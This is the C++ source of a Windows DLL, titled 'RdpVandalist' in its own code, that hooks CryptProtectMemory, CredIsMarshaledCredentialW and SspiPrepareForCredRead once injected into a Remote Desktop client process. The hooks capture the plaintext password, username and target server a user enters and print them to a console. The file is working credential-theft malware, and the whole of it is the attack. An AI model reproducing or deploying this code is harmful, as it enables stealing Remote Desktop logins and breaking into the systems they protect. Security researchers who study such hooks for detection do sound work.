#include<windows.h>
#include "./Rc7/Hook.hpp"
#include<iostream>


struct CredData {
    LPCWSTR lpTempPassword;
    LPCWSTR lpUsername;
    LPCWSTR lpServer;
};

CredData globalCreds{ 0 };

typedef BOOL(WINAPI* typeCredIsMarshaledCredentialW) (
    LPCWSTR MarshaledCredential
);

typeCredIsMarshaledCredentialW orgCredIsMarshaledCredentialW;

BOOL hkCredIsMarshaledCredentialW(LPCWSTR MarshaledCredential) {
    
    globalCreds.lpUsername = MarshaledCredential;

    if (!(wcslen(globalCreds.lpUsername) == 0)) {
        wprintf(L"[+] Updated Creds, Username: %s\n", globalCreds.lpUsername);
    }
    
    return orgCredIsMarshaledCredentialW(MarshaledCredential);
}

typedef PVOID PSEC_WINNT_AUTH_IDENTITY_OPAQUE;

typedef BOOL (WINAPI* typeSspiPrepareForCredRead) (
    PVOID AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR* ppszCredmanTargetName
);
typeSspiPrepareForCredRead orgSspiPrepareForCredRead;

SECURITY_STATUS __stdcall hkSspiPrepareForCredRead(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR* ppszCredmanTargetName) {

    globalCreds.lpServer = pszTargetName;

    if (!(wcslen(globalCreds.lpServer) == 0)) {
        wprintf(L"[+] Updated Creds, Ip: %s\n", globalCreds.lpServer);
    }
    
    return orgSspiPrepareForCredRead(AuthIdentity, pszTargetName, pCredmanCredentialType, ppszCredmanTargetName);
}


typedef BOOL(WINAPI* typeCryptProtectMemory) (
    LPVOID pDataIn,
    DWORD  cbDataIn,
    DWORD  dwFlags
);
typeCryptProtectMemory orgCryptProtectMemory;

BOOL hkCryptProtectMemory(LPVOID pDataIn, DWORD cbDataIn, DWORD  dwFlags) {

    PINT dataPtr = (PINT)pDataIn;
    LPVOID lpPasswordAddress = dataPtr + 0x1;

    if ((DWORD)(*(DWORD*)(pDataIn)) > 0x2) {

        PVOID buff = malloc(cbDataIn);
        memcpy(buff, lpPasswordAddress, cbDataIn);

        globalCreds.lpTempPassword = (LPCWSTR)buff;

        wprintf(L"[+] Password: %s\n", globalCreds.lpTempPassword);
    }
    
    return orgCryptProtectMemory(pDataIn, cbDataIn, dwFlags);
}


void SetUpConsole() {
    FILE* conOut;
    AllocConsole();
    SetConsoleTitleA("RdpVandalist");
    freopen_s(&conOut, "CONOUT$", "w", stdout);
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{

    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {

        SetUpConsole();

        Rc7Hook pwdHook = Rc7Hook { "dpapi.dll", "CryptProtectMemory", hkCryptProtectMemory , (PVOID*)&orgCryptProtectMemory };
        pwdHook.Enable();

        Rc7Hook nameHook = Rc7Hook { "advapi32.dll", "CredIsMarshaledCredentialW", hkCredIsMarshaledCredentialW , (PVOID*)&orgCredIsMarshaledCredentialW };
        nameHook.Enable();

        Rc7Hook ipHook = Rc7Hook { "SspiCli.dll" , "SspiPrepareForCredRead",  hkSspiPrepareForCredRead, (PVOID*)&orgSspiPrepareForCredRead };
        ipHook.Enable();
    }
    
    return TRUE;
}

